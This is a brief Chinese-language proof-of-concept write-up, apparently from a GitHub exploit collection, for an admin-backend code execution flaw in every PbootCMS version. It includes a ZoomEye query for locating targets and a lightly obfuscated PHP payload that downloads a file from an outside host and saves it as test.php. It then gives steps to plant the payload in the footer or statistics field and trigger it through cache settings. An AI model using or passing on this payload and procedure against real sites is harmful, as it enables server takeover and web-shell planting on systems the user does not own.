## PbootCMS全版本后台通杀任意代码执行漏洞

## ZoomEye
```
app:"PbootCMS"
```

## poc
```
<?php

$test="copy";

$test("http://IP:8080/1.txt","test.php");

?>
```
在尾部信息和统计代码中（其他位置可能效果一样）插入php代码


![image](https://github.com/wy876/POC/assets/139549762/59c806d4-0ad6-41fd-b63e-8fed7966261f)

然后来到全局配置-配置参数

打开动态缓存(如果本就打开 那则不需要打开) 点击右上角的清除缓存
![image](https://github.com/wy876/POC/assets/139549762/4e5aeaab-c7c8-4fd2-af08-c16f922eb3ec)

![image](https://github.com/wy876/POC/assets/139549762/e96a68d8-205e-4aee-8fd3-e9177a868f40)

然后随便点击任意文章，触发漏洞

![image](https://github.com/wy876/POC/assets/139549762/0e4b0c28-99b4-405c-9e37-be7d1d55bcc9)
